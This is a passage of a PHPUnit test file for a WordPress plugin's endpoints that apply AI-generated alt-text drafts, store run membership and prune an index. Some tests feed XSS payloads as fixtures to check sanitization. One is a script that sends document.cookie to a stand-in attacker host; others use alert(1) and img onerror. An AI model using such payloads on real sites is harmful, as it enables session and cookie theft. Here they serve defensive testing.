        $hostile = "<script>fetch('https://attacker.invalid/?c='+document.cookie)</script>A calm lake.";
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => $hostile,
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());
        $this->assertSame([71], $response->get_data()['applied']);

        $stored = get_post_meta(71, '_wp_attachment_image_alt', true);
        $this->assertStringNotContainsString('<script>', $stored);
        $this->assertStringNotContainsString('attacker.invalid', $stored);
        $this->assertStringNotContainsString('document.cookie', $stored);
        $this->assertSame('A calm lake.', $stored);
    }

    /**
     * BR-133: bare `<` in prose must not truncate bulk-apply drafts.
     * Goes RED if apply still uses bare wp_strip_all_tags / strip_tags.
     *
     * @dataProvider bareLessThanDraftProvider
     */
    public function testApplyPreservesBareLessThanInAltTextDraft(string $draft, string $expected): void
    {
        $runId = '11111111-1111-1111-1111-111111111133';
        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => $draft,
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame([71], $response->get_data()['applied']);
        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertStringNotContainsString('<script>', (string) get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertStringNotContainsString('<img', (string) get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function bareLessThanDraftProvider(): array
    {
        return [
            'comparison' => ['x <= y', 'x &lt;= y'],
            'heart_prose' => [
                'Photo of a <3 shaped cloud above the lake',
                'Photo of a &lt;3 shaped cloud above the lake',
            ],
            'script_still_stripped' => [
                '<script>alert(1)</script>Safe text',
                'Safe text',
            ],
            'img_onerror_still_stripped' => [
                '<img src=x onerror=alert(1)>A photo.',
                'A photo.',
            ],
        ];
    }

    /**
     * BR-133 seam: partial → retry → recover must hash the *sanitized* draft
     * (same value written to alt and to the pending marker) when the draft
     * contains both markup and a bare `<`.
     */
    public function testApplyPartialRecoveryWithBareLessThanAndMarkup(): void
    {
        $runId = '11111111-1111-1111-1111-111111111134';
        $rawDraft = 'x <= y <script>alert(1)</script> and a <3 cloud';
        $expected = sanitize_text_field($rawDraft);
        // Script body removed; remaining whitespace collapsed by sanitize_text_field.
        $this->assertSame('x &lt;= y and a &lt;3 cloud', $expected);

        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [71]);
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => $rawDraft,
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
                    ],
                ],
            ]),
        ]);

        $first = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $first->set_param('run_id', $runId);
        $firstResponse = $this->controller->apply_describe_run_drafts($first);
        $this->assertNotInstanceOf(\WP_Error::class, $firstResponse);
        $this->assertSame([71], $firstResponse->get_data()['partial']);
        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame(hash('sha256', $expected), $pending['draft_hash']);

        unset($GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance']);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => $rawDraft,
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
                    ],
                ],
            ]),
        ]);

        $second = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $second->set_param('run_id', $runId);
        $secondResponse = $this->controller->apply_describe_run_drafts($second);
        $this->assertNotInstanceOf(\WP_Error::class, $secondResponse);
        $this->assertSame([71], $secondResponse->get_data()['applied']);
        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame($runId, $prov['run_id']);
    }

    /**
     * BR-134: membership is durable — apply still works after 24h.
     * Goes RED if load_run_media_ids reintroduces a TTL gate.
     */
    public function testApplyWorksWhenMembershipOlderThan24Hours(): void
    {
        $runId = '11111111-1111-1111-1111-111111111135';
        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [71], time() - 90000);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => 'still applyable',
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame([71], $response->get_data()['applied']);
        $this->assertSame('still applyable', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-134 / BR-143: failed durable membership write must not report submit
     * success. Goes RED if store_run_media_ids discards update_option's return.
     * BR-143: WP_Error data carries run_id and the message names the run in prose.
     */
    public function testSubmitFailsLoudlyWhenMembershipWriteFails(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111136';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);
        $optionKey = 'acx_describe_run_media_ids_' . $runId;
        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;
        $GLOBALS['__ac_update_option_calls'] = [];

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_media_ids_store_failed', $response->get_error_code());
        $this->assertSame($runId, $response->get_error_data()['run_id'] ?? null);
        $this->assertStringContainsString('cannot be applied', $response->get_error_message());
        // BR-143: message must name the run id in prose for message-only clients.
        $this->assertStringContainsString($runId, $response->get_error_message());
        $this->assertFalse(get_option($optionKey, false));
        // BR-143: membership write is retried once before giving up.
        $this->assertSame(2, $GLOBALS['__ac_update_option_calls'][$optionKey] ?? 0);
    }

    /**
     * BR-134: index pruner drops age-expired membership options and leaves current.
     */
    public function testMembershipIndexPrunesByAge(): void
    {
        $oldRun = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        $this->plantSubmittedMediaIds($oldRun, [1], time() - 31 * 86400);

        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $newRun = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $newRun,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $oldRun, false));
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $newRun, false));
        $index = get_option('acx_describe_run_media_ids_index', []);
        $this->assertArrayNotHasKey($oldRun, $index);
        $this->assertArrayHasKey($newRun, $index);
    }

    /**
     * BR-134 / BR-142: index pruner caps at 200 by evicting entries older than the
     * 7-day retention floor (oldest first). Entries past the floor but under the
     * 30d hard age prune are eligible for cap eviction.
     *
     * Changed from the pre-BR-142 behaviour that evicted *any* oldest entry past
     * the cap (including same-day runs). Authorization outranks storage economy:
     * only aged-past-floor entries may be cap-evicted.
     */
    public function testMembershipIndexPrunesByCap(): void
    {
        $now = time();
        // All 200 entries are ~8–10 days old: older than the 7d floor, younger
        // than the 30d age prune — so cap eviction (not age) removes the oldest.
        for ($i = 0; $i < 200; $i++) {
            $runId = sprintf('cccccccc-cccc-cccc-cccc-%012d', $i);
            $this->plantSubmittedMediaIds($runId, [1], $now - (10 * 86400) + $i);
        }
        $oldestRun = sprintf('cccccccc-cccc-cccc-cccc-%012d', 0);
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));

        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $newRun = 'dddddddd-dddd-dddd-dddd-dddddddddddd';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $newRun,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $index = get_option('acx_describe_run_media_ids_index', []);
        $this->assertCount(200, $index);
        $this->assertArrayNotHasKey($oldestRun, $index);
        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $oldestRun, false));
        $this->assertArrayHasKey($newRun, $index);
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $newRun, false));
    }

    /**
     * BR-142: when the index is past the 200 cap entirely with *recent* runs
     * (younger than the 7d retention floor), cap eviction must not revoke the
     * oldest membership — let the index exceed the cap. Goes RED if prune still
     * delete_option()s any oldest entry regardless of age.
     */
    public function testMembershipIndexCapDoesNotEvictRecentRuns(): void
    {
        $now = time();
        for ($i = 0; $i < 200; $i++) {
            $runId = sprintf('eeeeeeee-eeee-eeee-eeee-%012d', $i);
            // All within ~33 minutes — well under the 7-day floor.
            $this->plantSubmittedMediaIds($runId, [70 + ($i % 5)], $now - 2000 + $i);
        }
        $oldestRun = sprintf('eeeeeeee-eeee-eeee-eeee-%012d', 0);
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));

        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $newRun = 'ffffffff-ffff-ffff-ffff-ffffffffffff';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $newRun,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $index = get_option('acx_describe_run_media_ids_index', []);
        // Cap may not be satisfied — index exceeds 200 rather than revoke live runs.
        $this->assertGreaterThan(200, count($index));
        $this->assertArrayHasKey($oldestRun, $index);
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));
        $this->assertArrayHasKey($newRun, $index);

        // Oldest recent membership still authorizes apply.
        $this->plantPostType(70);
        $this->queueRunStatusResponse($oldestRun, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $oldestRun,
                'items' => [
                    [
                        'media_id' => 70,
                        'status' => 'completed',
                        'alt_text_draft' => 'still live after cap overflow',
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);
        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $oldestRun . '/apply');
        $apply->set_param('run_id', $oldestRun);
        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
        $this->assertNotInstanceOf(\WP_Error::class, $applyResponse);
        $this->assertSame([70], $applyResponse->get_data()['applied']);
    }

    /**
     * BR-148: index write failure must not silently orphan membership forever
     * without visibility — retry once, keep membership, log the condition.
     * Goes RED if remember_run_media_ids_index ignores update_option's return.
     */
    public function testIndexWriteFailureRetriesAndKeepsMembership(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111148';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $indexKey = 'acx_describe_run_media_ids_index';
        $membershipKey = 'acx_describe_run_media_ids_' . $runId;
        $GLOBALS['__ac_update_option_fail'][$indexKey] = true;
        $GLOBALS['__ac_update_option_calls'] = [];

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);

        // Membership write succeeded; submit still 202 — authorization retained.
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertIsArray(get_option($membershipKey, false));
        // Index never persisted (forced failure).
        $this->assertFalse(get_option($indexKey, false));
        // Retry once → two update_option attempts on the index key.
        $this->assertSame(2, $GLOBALS['__ac_update_option_calls'][$indexKey] ?? 0);
        // Condition is not swallowed.
        $log = $this->getErrorLog();
        $this->assertNotEmpty($log);
        $this->assertTrue(
            (bool) array_filter(
                $log,
                static fn (string $line): bool => str_contains($line, 'media_ids index write failed')
                    && str_contains($line, $runId)
            ),
            'Expected telemetry log naming the failed index write and run_id'
        );
    }

    /**
     * BR-146: membership is stored only on a successful submit (status < 400).
     * An upstream 500 that echoes a run_id must not plant an authorization record.
     * Goes RED if the guard stores whenever the body is a WP_REST_Response.
     */
    public function testFailedSubmitDoesNotStoreMembershipEvenWithRunId(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111146';
        $this->queueHttpResponse([
            'response' => ['code' => 500, 'message' => 'Internal Server Error'],
            'body' => json_encode([
                'run_id' => $runId,
                'detail' => 'upstream exploded after assigning a run_id',
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_REST_Response::class, $response);
        $this->assertSame(500, $response->get_status());
        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $runId, false));
        $index = get_option('acx_describe_run_media_ids_index', []);
        if (is_array($index)) {
            $this->assertArrayNotHasKey($runId, $index);
        }

        // Subsequent apply of that run id is refused (fail closed).
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 101,
                        'status' => 'completed',
                        'alt_text_draft' => 'should not apply',
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);
        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $apply->set_param('run_id', $runId);
        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
        $this->assertInstanceOf(\WP_Error::class, $applyResponse);
        $this->assertSame('describe_run_media_ids_unknown', $applyResponse->get_error_code());
    }

    /**
     * BR-145: non-array items must yield the 502 contract violation on GET /items
     * and on apply — not a PHP TypeError fatal during enrichment.
     */
    public function testNonArrayItemReturnsContractViolationOnItemsAndApply(): void
    {
        $runId = '11111111-1111-1111-1111-111111111145';
        $nonArrayBody = json_encode([
            'tenant_id' => self::currentTenantId(),
            'run_id' => $runId,
            'items' => ['not-an-object'],
        ]);

        // GET /items
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => $nonArrayBody,
        ]);
        $itemsReq = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
        $itemsReq->set_param('run_id', $runId);
        $itemsResponse = $this->controller->get_describe_run_items($itemsReq);
        $this->assertInstanceOf(\WP_Error::class, $itemsResponse);
        $this->assertSame('describe_run_items_contract_violation', $itemsResponse->get_error_code());
        $this->assertSame(502, $itemsResponse->get_error_data()['status'] ?? null);

        // POST /apply — enrichment runs via get_describe_run_items before the loop.
        $this->plantSubmittedMediaIds($runId, [70]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => $nonArrayBody,
        ]);
        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $apply->set_param('run_id', $runId);
        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
        $this->assertInstanceOf(\WP_Error::class, $applyResponse);
        $this->assertSame('describe_run_items_contract_violation', $applyResponse->get_error_code());
        $this->assertSame(502, $applyResponse->get_error_data()['status'] ?? null);
    }

    /**
     * BR-147: when a matching membership record already exists, update_option's
     * false (forced failure *or* unchanged value) is recovered — submit succeeds.
     * Goes RED if the recovery branch is missing or the stub never returns false
     * for identical writes.
     */
    public function testSubmitSucceedsWhenMatchingMembershipAlreadyPresent(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111147';
        $optionKey = 'acx_describe_run_media_ids_' . $runId;

        // Plant a matching record, then force the write to fail so recovery fires.
        update_option(
            $optionKey,
            [
                'media_ids' => [101],
                'created_at' => time() - 60,
            ],
            false
        );
        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(202, $response->get_status());
        $this->assertIsArray(get_option($optionKey, false));
    }

    /**
     * BR-147: membership option must be written with autoload=false.
     * Goes RED if store_run_media_ids drops the third arg or passes true.
     */
    public function testMembershipOptionWrittenWithoutAutoload(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111157';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $optionKey = 'acx_describe_run_media_ids_' . $runId;
        $this->assertArrayHasKey($optionKey, $GLOBALS['__ac_option_autoload'] ?? []);
        $this->assertFalse($GLOBALS['__ac_option_autoload'][$optionKey]);
        $this->assertArrayHasKey('acx_describe_run_media_ids_index', $GLOBALS['__ac_option_autoload'] ?? []);
        $this->assertFalse($GLOBALS['__ac_option_autoload']['acx_describe_run_media_ids_index']);
    }

    /**
     * BR-147: media_ids equality uses array_values() so a list stored under
     * non-contiguous keys still matches. Goes RED if the compare drops
     * array_values() and rejects a value-equal but key-shifted record.
     */
    public function testMembershipRecoveryComparesMediaIdsByValueNotKeys(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $this->plantAttachment(202, "\xff\xd8\xff\xe0jpeg-202", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111167';
        $optionKey = 'acx_describe_run_media_ids_' . $runId;

        // Plant with non-contiguous keys (not 0..n) — equal after array_values().
        update_option(
            $optionKey,
            [
                'media_ids' => [2 => 101, 5 => 202],
                'created_at' => time() - 30,
            ],
            false
        );
        // Force false so the recovery / equality branch must fire.
        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 2,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101, 202]);
        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(202, $response->get_status());
    }
}
